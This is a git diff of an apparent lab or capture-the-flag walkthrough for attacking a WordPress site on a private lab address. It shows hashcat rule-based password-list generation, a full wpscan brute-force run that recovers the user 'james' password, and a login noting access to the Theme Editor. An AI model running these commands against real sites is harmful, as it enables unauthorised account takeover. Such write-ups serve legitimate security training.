@@ -273,52 +273,145 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:05
 ```
 
-8. Simultaneously, do directory busting on the `/wordpress` folder.
+8. The wpscan didn't find any plugins but it did find user `james`, so we will do a bruteforce attack to get his password. However, before we do, we will create a custom wordlist of passwords using Hashcat rules
 
 ```
-$ ffuf -u http://10.10.110.100:65000/wordpress/FUZZ -e .php,.swp,.xml,.json,.config -fc 403 -w /usr/share/wordlists/dirb/common.txt 
+$ cat custom.rules                          
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+:
+c
+so0
+c so0
+sa@
+c sa@
+c sa@ so0
+$!
+$! c
+$! so0
+$! sa@
+$! c so0
+$! c sa@
+$! so0 sa@
+$! c so0 sa@
 
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.10.110.100:65000/wordpress/FUZZ
- :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
- :: Extensions       : .php .swp .xml .json .config 
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-                        [Status: 200, Size: 41962, Words: 1658, Lines: 389, Duration: 122ms]
-index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 87ms]
-index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
-robots.txt              [Status: 200, Size: 34, Words: 4, Lines: 3, Duration: 67ms]
-wp-admin                [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 67ms]
-wp-blog-header.php      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 91ms]
-wp-content              [Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 67ms]
-wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 76ms]
-wp-cron.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
-wp-includes             [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 67ms]
-wp-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
-wp-login.php            [Status: 200, Size: 5090, Words: 214, Lines: 86, Duration: 85ms]
-wp-links-opml.php       [Status: 200, Size: 224, Words: 13, Lines: 12, Duration: 97ms]
-wp-mail.php             [Status: 403, Size: 2709, Words: 213, Lines: 121, Duration: 88ms]
-wp-settings.php         [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
-wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
-wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 104ms]
-xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 83ms]
-xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 82ms]
-:: Progress: [27684/27684] :: Job [1/1] :: 595 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
+$ hashcat --force /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -r custom.rules --stdout | sort -u > custom_passwords.wordlist
 ```
 
-9. 
+9. Now run password bruteforce attack with custom password list
+```
+$ wpscan --url http://10.10.110.100:65000/wordpress -U james -P custom_passwords.wordlist -t 50
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
+[+] Started: Sat Dec 13 20:22:15 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+ |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2025-12-03T00:00:00.000Z
+ | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 3.0
+ | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 <===============================================================> (137 / 137) 100.00% Time: 00:00:04
+
+[i] Config Backup(s) Identified:
+
+[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
+ | Found By: Direct Access (Aggressive Detection)
+
+[+] Performing password attack on Wp Login against 1 user/s
+Trying james / Pic Time: 00:12:10 <======   > (49261 / 71979) 68.43%  ETA: 00:05:37s Time: 00:12:10 <======   > (49261 / 71979) 68.43%  ETA: 0[SUCCESS] - james / Toyota                                                                                                                    
+Trying james / Toyota Time: 00:16:19 <==============================                                  > (65850 / 137829) 47.77%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: james, Password: Toyota
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Dec 13 20:38:52 2025
+[+] Requests Done: 65989
+[+] Cached Requests: 42
+[+] Data Sent: 35.523 MB
+[+] Data Received: 370.91 MB
+[+] Memory used: 285.234 MB
+[+] Elapsed time: 00:16:37
+```
+
+10. Login using credentials `james:Toyota` and we find we can use the `Theme Editor` feature.
+
+
